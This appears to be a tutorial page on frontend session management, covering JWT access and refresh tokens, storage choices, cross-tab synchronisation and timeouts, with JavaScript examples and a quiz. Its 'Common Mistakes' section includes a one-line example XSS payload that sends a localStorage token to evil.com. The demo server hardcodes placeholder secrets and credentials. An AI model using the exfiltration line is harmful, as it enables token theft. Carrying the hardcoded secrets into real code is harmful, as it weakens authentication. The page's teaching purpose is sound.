---
title: Session
layout: doc
slug: session
---

# Session

## Key Insight

Session management in frontend applications balances stateless authentication (JWT tokens for API authorization) with stateful user experience (persisting preferences, cart data, form progress across page reloads and browser sessions) through layered storage strategies—HTTP-only cookies for security-critical auth tokens preventing XSS theft, localStorage for persistent user preferences surviving browser restarts, sessionStorage for temporary tab-specific state, and server-side sessions for sensitive data requiring server validation—while implementing token rotation, silent refresh, and cross-tab synchronization to maintain seamless authentication across multiple windows without re-login prompts or data loss.

## Detailed Description

Session management addresses the fundamental challenge of maintaining user state in stateless HTTP environments: web applications need to remember who you are (authentication), what you're doing (application state), and your preferences (personalization) across requests, page reloads, and browser sessions, while balancing security (preventing token theft, XSS, CSRF attacks), performance (minimizing server roundtrips), and user experience (no unexpected logouts, data persistence, cross-tab consistency). Traditional server-rendered apps store everything server-side with session cookies, but modern SPAs distribute state across client storage (localStorage, sessionStorage, cookies) and server sessions, requiring careful orchestration.

The three-layer session architecture separates concerns: (1) **Application Session** (client-side state managing UI preferences, shopping cart, form drafts, navigation history using localStorage/sessionStorage/IndexedDB, survives page reloads, may persist across browser sessions), (2) **Authentication Session** (auth provider like Auth0/Okta tracking logged-in user with refresh tokens in HTTP-only cookies, access tokens short-lived 15min in memory, refresh tokens long-lived 30 days rotating on use, silent authentication via hidden iframe refreshing tokens before expiration), (3) **Identity Provider Session** (Google/Facebook/Microsoft SSO remembering user login, enables single sign-on across multiple apps, controlled by IdP not your application, logout requires IdP logout endpoint). These layers interact—IdP session enables Auth session creation, Auth session gates Application session access—but expire independently causing logout confusion ("I was just logged into Gmail, why did your app log me out?").

Token-based authentication using JWTs replaces session IDs: **Access Tokens** (short-lived 15-60min, included in Authorization header for API requests, contains user claims encoded in JWT payload, stateless server validation via signature checking no database lookup, expires quickly limiting damage if stolen), **Refresh Tokens** (long-lived 30-90 days, stored in HTTP-only cookies preventing JavaScript access, used exclusively to obtain new access tokens via `/oauth/token` endpoint, rotates on each use invalidating old token, server tracks in database enabling revocation). Access tokens stay in memory (JavaScript variable, React state) never localStorage avoiding XSS theft—if attacker injects script they can't read HTTP-only refresh token cookie. Silent authentication refreshes access tokens before expiration using hidden iframe calling `/authorize` with `prompt=none` parameter, seamlessly maintaining session without user interruption.

Storage strategies balance security vs persistence vs scope: **Cookies** (HTTP-only secure SameSite cookies for refresh tokens, 4KB limit, sent automatically with requests, vulnerable to CSRF requiring CSRF tokens, scoped to domain/path, accessible across tabs, survive browser restart if persistent), **localStorage** (5-10MB limit, persists across browser restarts, accessible from all tabs same origin, synchronizes via storage event listener, vulnerable to XSS attacks avoid storing tokens, ideal for user preferences theme/language, cart data, draft content), **sessionStorage** (5-10MB limit, scoped to single tab, clears on tab close, isolated between tabs, ideal for wizard progress, temporary filters, tab-specific state), **IndexedDB** (50MB+ limit, asynchronous key-value store, structured data with indexes, ideal for offline data caching, large datasets, transaction support). Never store sensitive tokens in localStorage—if XSS attacker injects `<script>` they can read localStorage but not HTTP-only cookies.

Cross-tab synchronization keeps multiple windows consistent: BroadcastChannel API sends messages to all tabs (logout in one tab logs out all tabs, cart update reflects everywhere, permission changes propagate), localStorage storage event fires when other tabs modify localStorage (listen for token changes indicating logout/login), SharedWorker maintains single background process coordinating tabs (centralized token refresh avoiding race conditions, single WebSocket connection shared across tabs), ServiceWorker intercepts all fetch requests applying consistent authentication (inject access token into API requests, refresh token if expired, logout all tabs on 401). Without synchronization, user logs out in Tab A but Tab B remains "logged in" with expired token causing confusing 401 errors.

Token rotation prevents replay attacks: each refresh token use returns new access token + new refresh token invalidating old refresh token (refresh token A → access token B + refresh token C, using refresh token A again fails), server tracks refresh token family (issued_token → used_by_token → used_by_token forming chain), detects reuse (old refresh token used indicates potential theft), revokes entire family (logout all sessions for that user across all devices), rotating refresh tokens limits damage window (stolen token only valid until next rotation ~15min). Implementation requires database storage tracking (token_id, user_id, family_id, created_at, expires_at, revoked_at), refresh endpoint validates token family, atomic token rotation preventing race conditions.

Silent authentication maintains sessions transparently: access token expires in 15min, application checks expiration before API calls, triggers refresh 5min before expiry, creates hidden iframe calling `/authorize` with `prompt=none` (skips login UI if Auth session valid), receives new tokens via postMessage, updates access token in memory, continues API request seamlessly. User never sees login prompt as long as Auth session (refresh token) valid. Fallback to full login if Auth session expired (refresh token invalid), redirect to `/login` with `return_url` preserving navigation intent, after login redirect back to original page, restore application state from sessionStorage.

Session timeout strategies balance security vs UX: **Absolute timeout** (30-day maximum regardless of activity, refresh token expires forcing re-login, prevents indefinite sessions), **Sliding timeout** (extends session on activity, "remember me" checkbox enables longer absolute timeout 90 days vs 30 days, last_activity timestamp updates on API calls, logout if inactive >30min), **Hybrid approach** (sliding timeout up to absolute maximum, activity extends up to 2 hours, absolute maximum 30 days, balances convenience and security). Implement activity tracking (mouse/keyboard listeners update last_activity localStorage, before API call check Date.now() - last_activity > 30min, if inactive too long logout locally, server validates timestamp preventing client manipulation).

Cross-domain session management for multi-domain SPAs (app.example.com, shop.example.com, blog.example.com sharing authentication): **Push approach** (main domain maintains WebSocket connection to auth server, other domains embed iframe from main domain, iframe postMessage sends tokens to parent window, all domains stay synchronized), **Poll approach** (each domain polls auth server every 5min checking session validity, /session/status endpoint returns logged-in state, creates new session if IdP session valid, race condition window between domains), **Subdomain cookie sharing** (set refresh token cookie with domain=.example.com, accessible across all subdomains, requires all subdomains on same root domain, doesn't work for completely different domains app.com and shop.net). Third-party cookie deprecation (Safari ITP, Chrome Privacy Sandbox) breaks iframe approach—fallback to server-side session tracking with client polling.

## Code Examples

### Basic Example: Token-Based Authentication with Refresh

Simple JWT authentication with automatic token refresh:

```javascript
// ===== auth.js =====
// Authentication service managing tokens

class AuthService {
  constructor() {
    this.accessToken = null;
    this.refreshTokenTimeout = null;
  }
  
  // Login with credentials
  async login(email, password) {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // Send cookies
      body: JSON.stringify({ email, password })
    });
    
    if (!response.ok) {
      throw new Error('Login failed');
    }
    
    const { accessToken, expiresIn } = await response.json();
    
    // Store access token in memory (NOT localStorage)
    this.accessToken = accessToken;
    
    // Refresh token stored in HTTP-only cookie (set by server)
    // Schedule refresh before expiration
    this.scheduleTokenRefresh(expiresIn);
    
    return accessToken;
  }
  
  // Refresh access token using refresh token cookie
  async refreshAccessToken() {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include' // Send refresh token cookie
      });
      
      if (!response.ok) {
        throw new Error('Refresh failed');
      }
      
      const { accessToken, expiresIn } = await response.json();
      this.accessToken = accessToken;
      this.scheduleTokenRefresh(expiresIn);
      
      return accessToken;
    } catch (error) {
      // Refresh failed - logout user
      this.logout();
      throw error;
    }
  }
  
  // Schedule token refresh 5 minutes before expiration
  scheduleTokenRefresh(expiresIn) {
    // Clear existing timeout
    if (this.refreshTokenTimeout) {
      clearTimeout(this.refreshTokenTimeout);
    }
    
    // Refresh 5 minutes (300s) before expiration
    const refreshTime = (expiresIn - 300) * 1000;
    
    this.refreshTokenTimeout = setTimeout(() => {
      this.refreshAccessToken();
    }, refreshTime);
  }
  
  // Logout (clear tokens)
  async logout() {
    // Clear access token from memory
    this.accessToken = null;
    
    // Clear refresh timeout
    if (this.refreshTokenTimeout) {
      clearTimeout(this.refreshTokenTimeout);
    }
    
    // Call logout endpoint to clear refresh token cookie
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include'
    });
  }
  
  // Get current access token (refresh if needed)
  async getAccessToken() {
    if (!this.accessToken) {
      // No token - try to refresh from cookie
      try {
        await this.refreshAccessToken();
      } catch {
        return null;
      }
    }
    
    return this.accessToken;
  }
  
  // Check if user is authenticated
  isAuthenticated() {
    return this.accessToken !== null;
  }
}

export const authService = new AuthService();


// ===== api.js =====
// API client with automatic token injection

async function apiCall(url, options = {}) {
  // Get access token
  const token = await authService.getAccessToken();
  
  if (!token) {
    throw new Error('Not authenticated');
  }
  
  // Inject Authorization header
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${token}`
  };
  
  const response = await fetch(url, {
    ...options,
    headers
  });
  
  // Handle 401 Unauthorized - token expired
  if (response.status === 401) {
    try {
      // Try to refresh token
      await authService.refreshAccessToken();
      
      // Retry request with new token
      const newToken = await authService.getAccessToken();
      headers.Authorization = `Bearer ${newToken}`;
      
      return fetch(url, { ...options, headers });
    } catch {
      // Refresh failed - logout
      authService.logout();
      window.location.href = '/login';
    }
  }
  
  return response;
}


// ===== Server (Node.js/Express) =====
const express = require('express');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

const ACCESS_TOKEN_SECRET = 'your-access-token-secret';
const REFRESH_TOKEN_SECRET = 'your-refresh-token-secret';

// In-memory refresh token store (use Redis in production)
const refreshTokens = new Set();

// Login endpoint
app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  
  // Validate credentials (simplified)
  if (email === 'user@example.com' && password === 'password') {
    const user = { id: 1, email };
    
    // Generate access token (15 minutes)
    const accessToken = jwt.sign(user, ACCESS_TOKEN_SECRET, {
      expiresIn: '15m'
    });
    
    // Generate refresh token (30 days)
    const refreshToken = jwt.sign(user, REFRESH_TOKEN_SECRET, {
      expiresIn: '30d'
    });
    
    // Store refresh token
    refreshTokens.add(refreshToken);
    
    // Set refresh token as HTTP-only cookie
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,  // Prevents JavaScript access (XSS protection)
      secure: true,    // HTTPS only
      sameSite: 'strict', // CSRF protection
      maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
    });
    
    // Send access token in response
    res.json({
      accessToken,
      expiresIn: 900 // 15 minutes in seconds
    });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Refresh endpoint
app.post('/api/auth/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken || !refreshTokens.has(refreshToken)) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
  
  jwt.verify(refreshToken, REFRESH_TOKEN_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'Token expired' });
    }
    
    // Generate new access token
    const accessToken = jwt.sign(
      { id: user.id, email: user.email },
      ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );
    
    res.json({
      accessToken,
      expiresIn: 900
    });
  });
});

// Logout endpoint
app.post('/api/auth/logout', (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  // Remove refresh token from store
  refreshTokens.delete(refreshToken);
  
  // Clear cookie
  res.clearCookie('refreshToken');
  res.json({ message: 'Logged out' });
});
```

### Practical Example: Cross-Tab Session Synchronization

Keep authentication state synchronized across browser tabs:

```javascript
// ===== sessionSync.js =====
// Cross-tab session synchronization

class SessionSync {
  constructor() {
    this.channel = new BroadcastChannel('auth-channel');
    this.setupListeners();
  }
  
  setupListeners() {
    // Listen for messages from other tabs
    this.channel.addEventListener('message', (event) => {
      const { type, data } = event.data;
      
      switch (type) {
        case 'LOGIN':
          this.handleRemoteLogin(data);
          break;
        case 'LOGOUT':
          this.handleRemoteLogout();
          break;
        case 'TOKEN_REFRESH':
          this.handleRemoteTokenRefresh(data);
          break;
      }
    });
    
    // Also listen for localStorage changes (fallback for older browsers)
    window.addEventListener('storage', (event) => {
      if (event.key === 'logout-event') {
        this.handleRemoteLogout();
      }
    });
  }
  
  // Broadcast login to other tabs
  broadcastLogin(accessToken) {
    this.channel.postMessage({
      type: 'LOGIN',
      data: { accessToken }
    });
  }
  
  // Broadcast logout to other tabs
  broadcastLogout() {
    // BroadcastChannel
    this.channel.postMessage({ type: 'LOGOUT' });
    
    // localStorage fallback (triggers storage event in other tabs)
    localStorage.setItem('logout-event', Date.now().toString());
    localStorage.removeItem('logout-event');
  }
  
  // Broadcast token refresh to other tabs
  broadcastTokenRefresh(accessToken) {
    this.channel.postMessage({
      type: 'TOKEN_REFRESH',
      data: { accessToken }
    });
  }
  
  handleRemoteLogin(data) {
    authService.accessToken = data.accessToken;
    window.dispatchEvent(new CustomEvent('auth-state-changed', {
      detail: { authenticated: true }
    }));
  }
  
  handleRemoteLogout() {
    authService.accessToken = null;
    window.location.href = '/login';
  }
  
  handleRemoteTokenRefresh(data) {
    authService.accessToken = data.accessToken;
  }
}

export const sessionSync = new SessionSync();


// ===== Enhanced AuthService with cross-tab sync =====
class AuthService {
  async login(email, password) {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ email, password })
    });
    
    const { accessToken, expiresIn } = await response.json();
    this.accessToken = accessToken;
    this.scheduleTokenRefresh(expiresIn);
    
    // Broadcast login to other tabs
    sessionSync.broadcastLogin(accessToken);
    
    return accessToken;
  }
  
  async logout() {
    this.accessToken = null;
    
    if (this.refreshTokenTimeout) {
      clearTimeout(this.refreshTokenTimeout);
    }
    
    // Broadcast logout to other tabs BEFORE server call
    sessionSync.broadcastLogout();
    
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include'
    });
  }
  
  async refreshAccessToken() {
    const response = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include'
    });
    
    const { accessToken, expiresIn } = await response.json();
    this.accessToken = accessToken;
    this.scheduleTokenRefresh(expiresIn);
    
    // Broadcast token refresh to other tabs
    sessionSync.broadcastTokenRefresh(accessToken);
    
    return accessToken;
  }
}


// ===== SharedWorker approach (alternative) =====
// Centralizes token refresh across all tabs

// shared-worker.js
let accessToken = null;
let refreshTimeout = null;
const connections = [];

self.addEventListener('connect', (event) => {
  const port = event.ports[0];
  connections.push(port);
  
  port.addEventListener('message', async (e) => {
    const { type, data } = e.data;
    
    switch (type) {
      case 'LOGIN':
        accessToken = data.accessToken;
        scheduleRefresh(data.expiresIn);
        broadcastToAll({ type: 'TOKEN_UPDATED', accessToken });
        break;
        
      case 'LOGOUT':
        accessToken = null;
        clearTimeout(refreshTimeout);
        broadcastToAll({ type: 'LOGGED_OUT' });
        break;
        
      case 'GET_TOKEN':
        port.postMessage({ type: 'TOKEN', accessToken });
        break;
    }
  });
  
  port.start();
  
  // Send current token to new connection
  if (accessToken) {
    port.postMessage({ type: 'TOKEN', accessToken });
  }
});

function broadcastToAll(message) {
  connections.forEach(port => port.postMessage(message));
}

async function scheduleRefresh(expiresIn) {
  clearTimeout(refreshTimeout);
  
  refreshTimeout = setTimeout(async () => {
    // Refresh token
    const response = await fetch('/api/auth/refresh', {
      credentials: 'include'
    });
    const { accessToken: newToken, expiresIn } = await response.json();
    
    accessToken = newToken;
    scheduleRefresh(expiresIn);
    broadcastToAll({ type: 'TOKEN_UPDATED', accessToken: newToken });
  }, (expiresIn - 300) * 1000);
}


// Main app using SharedWorker
const worker = new SharedWorker('shared-worker.js');

worker.port.addEventListener('message', (event) => {
  const { type, accessToken } = event.data;
  
  if (type === 'TOKEN_UPDATED') {
    authService.accessToken = accessToken;
  } else if (type === 'LOGGED_OUT') {
    window.location.href = '/login';
  }
});

worker.port.start();
```

### Advanced Example: Session Persistence with Activity Tracking

Implement sliding timeout with activity tracking and state persistence:

```javascript
// ===== sessionManager.js =====
// Advanced session management with activity tracking

class SessionManager {
  constructor() {
    this.ACTIVITY_TIMEOUT = 30 * 60 * 1000; // 30 minutes
    this.ABSOLUTE_TIMEOUT = 30 * 24 * 60 * 60 * 1000; // 30 days
    
    this.lastActivity = Date.now();
    this.sessionStart = Date.now();
    
    this.setupActivityTracking();
    this.setupSessionChecks();
    this.restoreSession();
  }
  
  setupActivityTracking() {
    // Track user activity
    const activityEvents = ['mousedown', 'keydown', 'scroll', 'touchstart'];
    
    const updateActivity = () => {
      this.lastActivity = Date.now();
      this.persistActivity();
    };
    
    // Throttle activity updates (max once per minute)
    let throttleTimeout = null;
    const throttledUpdate = () => {
      if (!throttleTimeout) {
        updateActivity();
        throttleTimeout = setTimeout(() => {
          throttleTimeout = null;
        }, 60000);
      }
    };
    
    activityEvents.forEach(event => {
      window.addEventListener(event, throttledUpdate, { passive: true });
    });
  }
  
  setupSessionChecks() {
    // Check session validity every minute
    setInterval(() => {
      this.checkSessionValidity();
    }, 60000);
    
    // Check when tab becomes visible (user returns)
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        this.checkSessionValidity();
      }
    });
  }
  
  checkSessionValidity() {
    const now = Date.now();
    const inactiveDuration = now - this.lastActivity;
    const sessionDuration = now - this.sessionStart;
    
    // Check activity timeout (sliding)
    if (inactiveDuration > this.ACTIVITY_TIMEOUT) {
      this.handleTimeout('Activity timeout - logged out due to inactivity');
      return;
    }
    
    // Check absolute timeout
    if (sessionDuration > this.ABSOLUTE_TIMEOUT) {
      this.handleTimeout('Session expired - please login again');
      return;
    }
    
    // Warn user if approaching timeout (5 minutes remaining)
    const timeUntilTimeout = this.ACTIVITY_TIMEOUT - inactiveDuration;
    if (timeUntilTimeout < 5 * 60 * 1000 && timeUntilTimeout > 4 * 60 * 1000) {
      this.showTimeoutWarning(timeUntilTimeout);
    }
  }
  
  handleTimeout(message) {
    // Clear session
    authService.logout();
    this.clearPersistedSession();
    
    // Redirect to login with message
    const returnUrl = encodeURIComponent(window.location.pathname);
    window.location.href = `/login?message=${encodeURIComponent(message)}&return=${returnUrl}`;
  }
  
  showTimeoutWarning(remainingTime) {
    const minutes = Math.floor(remainingTime / 60000);
    
    // Show notification/modal
    console.warn(`Session will expire in ${minutes} minutes`);
    
    // Could trigger UI notification
    window.dispatchEvent(new CustomEvent('session-timeout-warning', {
      detail: { remainingTime }
    }));
  }
  
  // Persist activity timestamp
  persistActivity() {
    localStorage.setItem('session_last_activity', this.lastActivity.toString());
  }
  
  // Restore session on page load
  restoreSession() {
    const savedActivity = localStorage.getItem('session_last_activity');
    const savedStart = localStorage.getItem('session_start');
    
    if (savedActivity) {
      this.lastActivity = parseInt(savedActivity);
    }
    
    if (savedStart) {
      this.sessionStart = parseInt(savedStart);
    } else {
      this.sessionStart = Date.now();
      localStorage.setItem('session_start', this.sessionStart.toString());
    }
    
    // Check if session is still valid
    this.checkSessionValidity();
  }
  
  clearPersistedSession() {
    localStorage.removeItem('session_last_activity');
    localStorage.removeItem('session_start');
  }
  
  // Extend session (called after successful re-authentication)
  extendSession() {
    this.sessionStart = Date.now();
    this.lastActivity = Date.now();
    localStorage.setItem('session_start', this.sessionStart.toString());
    this.persistActivity();
  }
}

export const sessionManager = new SessionManager();


// ===== Application state persistence =====
// Persist user state across sessions

class StatePersistence {
  constructor() {
    this.STORAGE_KEY = 'app_state';
  }
  
  // Save application state
  saveState(state) {
    try {
      const serialized = JSON.stringify({
        ...state,
        timestamp: Date.now()
      });
      localStorage.setItem(this.STORAGE_KEY, serialized);
    } catch (error) {
      console.error('Failed to save state:', error);
    }
  }
  
  // Restore application state
  restoreState() {
    try {
      const serialized = localStorage.getItem(this.STORAGE_KEY);
      
      if (!serialized) {
        return null;
      }
      
      const state = JSON.parse(serialized);
      const age = Date.now() - state.timestamp;
      
      // Ignore state older than 7 days
      if (age > 7 * 24 * 60 * 60 * 1000) {
        this.clearState();
        return null;
      }
      
      return state;
    } catch (error) {
      console.error('Failed to restore state:', error);
      return null;
    }
  }
  
  // Clear persisted state
  clearState() {
    localStorage.removeItem(this.STORAGE_KEY);
  }
  
  // Auto-save state on changes (debounced)
  setupAutoSave(getStateFunction, debounceMs = 1000) {
    let saveTimeout = null;
    
    const debouncedSave = () => {
      clearTimeout(saveTimeout);
      saveTimeout = setTimeout(() => {
        const state = getStateFunction();
        this.saveState(state);
      }, debounceMs);
    };
    
    // Save before page unload
    window.addEventListener('beforeunload', () => {
      const state = getStateFunction();
      this.saveState(state);
    });
    
    return debouncedSave;
  }
}

export const statePersistence = new StatePersistence();


// ===== Usage example =====
// React app with session and state persistence

import { useEffect, useState } from 'react';

function App() {
  const [userPreferences, setUserPreferences] = useState({
    theme: 'light',
    language: 'en',
    notifications: true
  });
  
  useEffect(() => {
    // Restore state on mount
    const restored = statePersistence.restoreState();
    if (restored?.userPreferences) {
      setUserPreferences(restored.userPreferences);
    }
    
    // Setup auto-save
    const saveState = statePersistence.setupAutoSave(() => ({
      userPreferences
    }));
    
    // Save on preference changes
    return () => saveState();
  }, [userPreferences]);
  
  // Listen for timeout warnings
  useEffect(() => {
    const handleWarning = (event) => {
      const minutes = Math.floor(event.detail.remainingTime / 60000);
      alert(`Your session will expire in ${minutes} minutes. Click to stay logged in.`);
      
      // Update activity to extend session
      sessionManager.lastActivity = Date.now();
      sessionManager.persistActivity();
    };
    
    window.addEventListener('session-timeout-warning', handleWarning);
    return () => window.removeEventListener('session-timeout-warning', handleWarning);
  }, []);
  
  return (
    <div className={`app theme-${userPreferences.theme}`}>
      {/* App content */}
    </div>
  );
}
```

## Common Mistakes

### 1. Storing Tokens in localStorage
**Mistake:** Saving access/refresh tokens in localStorage exposes them to XSS attacks.

```javascript
// ❌ BAD: Token in localStorage vulnerable to XSS
localStorage.setItem('accessToken', token);
localStorage.setItem('refreshToken', refreshToken);

// Attacker injects: <script>
//   fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'))
// </script>
```

```javascript
// ✅ GOOD: Tokens in memory + HTTP-only cookies
class AuthService {
  constructor() {
    this.accessToken = null; // Memory only
    // Refresh token in HTTP-only cookie (set by server)
  }
  
  async login(email, password) {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      credentials: 'include', // Send/receive cookies
      body: JSON.stringify({ email, password })
    });
    
    const { accessToken } = await response.json();
    this.accessToken = accessToken; // Memory only
    
    // Server sets: 
    // res.cookie('refreshToken', token, { httpOnly: true, secure: true })
  }
}
```

**Why it matters:** XSS attacks can read localStorage but not HTTP-only cookies. Access token in memory cleared on page refresh (refresh from cookie).

### 2. Not Handling Token Refresh Race Conditions
**Mistake:** Multiple simultaneous API calls trigger multiple refresh requests.

```javascript
// ❌ BAD: Race condition - multiple refresh calls
async function apiCall(url) {
  const token = await getAccessToken();
  
  const response = await fetch(url, {
    headers: { Authorization: `Bearer ${token}` }
  });
  
  if (response.status === 401) {
    await refreshAccessToken(); // Multiple calls trigger multiple refreshes!
    return apiCall(url); // Retry
  }
  
  return response;
}

// If 5 API calls happen simultaneously, all get 401, all trigger refresh
```

```javascript
// ✅ GOOD: Single refresh with promise caching
class AuthService {
  constructor() {
    this.accessToken = null;
    this.refreshPromise = null; // Cache refresh promise
  }
  
  async refreshAccessToken() {
    // Return existing refresh promise if already refreshing
    if (this.refreshPromise) {
      return this.refreshPromise;
    }
    
    this.refreshPromise = fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include'
    })
      .then(r => r.json())
      .then(data => {
        this.accessToken = data.accessToken;
        this.refreshPromise = null; // Clear promise
        return data.accessToken;
      })
      .catch(error => {
        this.refreshPromise = null;
        throw error;
      });
    
    return this.refreshPromise;
  }
}

// Now multiple simultaneous 401s share single refresh request
```

**Why it matters:** Multiple refresh requests can cause token rotation issues and server rate limiting.

### 3. Not Synchronizing Logout Across Tabs
**Mistake:** User logs out in one tab but remains logged in on others.

```javascript
// ❌ BAD: Logout only affects current tab
async function logout() {
  authService.accessToken = null;
  await fetch('/api/auth/logout', { credentials: 'include' });
  window.location.href = '/login';
}

// Other tabs still have accessToken in memory, causing confusing 401 errors
```

```javascript
// ✅ GOOD: Broadcast logout to all tabs
class SessionSync {
  constructor() {
    this.channel = new BroadcastChannel('auth-channel');
    this.setupListeners();
  }
  
  setupListeners() {
    this.channel.addEventListener('message', (event) => {
      if (event.data.type === 'LOGOUT') {
        // Another tab logged out - logout this tab too
        authService.accessToken = null;
        window.location.href = '/login';
      }
    });
    
    // Fallback for browsers without BroadcastChannel
    window.addEventListener('storage', (event) => {
      if (event.key === 'logout-event') {
        authService.accessToken = null;
        window.location.href = '/login';
      }
    });
  }
  
  broadcastLogout() {
    // Broadcast to other tabs
    this.channel.postMessage({ type: 'LOGOUT' });
    
    // localStorage fallback (triggers storage event in other tabs)
    localStorage.setItem('logout-event', Date.now().toString());
    localStorage.removeItem('logout-event');
  }
}

async function logout() {
  sessionSync.broadcastLogout(); // Notify all tabs
  authService.accessToken = null;
  await fetch('/api/auth/logout', { credentials: 'include' });
  window.location.href = '/login';
}
```

**Why it matters:** Inconsistent authentication state across tabs confuses users and causes unexpected 401 errors.

## Quick Quiz

{% include quiz.html id="session-1"
   question="What's the purpose of having both an access token AND a refresh token?"
   options="A|It's just historical;;B|Refresh tokens are deprecated;;C|Short-lived access tokens limit the damage if one leaks; a longer-lived refresh token (stored more securely, usually in an httpOnly cookie) lets the client exchange for new access tokens without asking the user to re-log in. Separation of duties;;D|They are the same token"
   correct="C"
   explanation="Compromise an access token and the window of misuse is minutes. Compromise the refresh token and you need a different, harder attack (XSS can't read httpOnly cookies) — defence in depth." %}

{% include quiz.html id="session-2"
   question="How does token rotation prevent replay attacks?"
   options="A|It disables token expiry;;B|By making tokens longer;;C|Every refresh exchanges the current refresh token for a new one and invalidates the old one. If an attacker replays an old refresh token, the server detects the collision and can revoke the whole family — confining the compromise and forcing a genuine re-auth;;D|Rotation is purely cosmetic"
   correct="C"
   explanation="Rotation + detection of reused refresh tokens is the OAuth 2.1 recommendation. It turns a silent replay into a visible anomaly the server can respond to." %}

{% include quiz.html id="session-3"
   question="What's a clean way to implement cross-tab session sync (so logging out in one tab logs out in all)?"
   options="A|Poll localStorage every 500ms;;B|Only open one tab;;C|Use BroadcastChannel or the 'storage' event to notify other tabs of login/logout/refresh events, and have each tab react (clear state, redirect to /login, retry requests with the new token);;D|Reload every tab on any click"
   correct="C"
   explanation="BroadcastChannel is the modern API; the 'storage' event is a fallback for older browsers. Either way: one tab publishes session events, all tabs subscribe." %}

{% include quiz.html id="session-4"
   question="What's the difference between a sliding and an absolute session timeout?"
   options="A|Absolute timeout only applies server-side;;B|Sliding timeout extends the expiry on every activity (&quot;idle for 30 minutes&quot; logs you out); absolute timeout expires a session N hours after login regardless of activity — so even an active session periodically forces re-auth. Most systems combine both: sliding for idle, absolute for hard cap;;C|Sliding timeout is insecure;;D|They're identical"
   correct="B"
   explanation="Sliding = user-friendly, limits idle risk. Absolute = security-friendly, caps session lifetime even for active users. Combine them for the best of both." %}

{% include quiz.html id="session-5"
   question="How should you persist session state across page reloads?"
   options="A|Only use cookies for everything;;B|In-memory only, so refresh always logs the user out;;C|Put tokens in the URL;;D|Keep the access token (or session id) in httpOnly cookie for the server to read, or in memory with a refresh cookie that re-hydrates on boot; avoid localStorage for tokens (XSS-readable). Put non-sensitive UI state in sessionStorage"
   correct="D"
   explanation="httpOnly cookies for secrets, memory (or ephemeral store) for the access token, and sessionStorage for non-sensitive UI state is the battle-tested combo." %}

## References

- [Auth0 Session Management Best Practices](https://auth0.com/blog/application-session-management-best-practices/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [RFC 6749 - OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [BroadcastChannel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API)
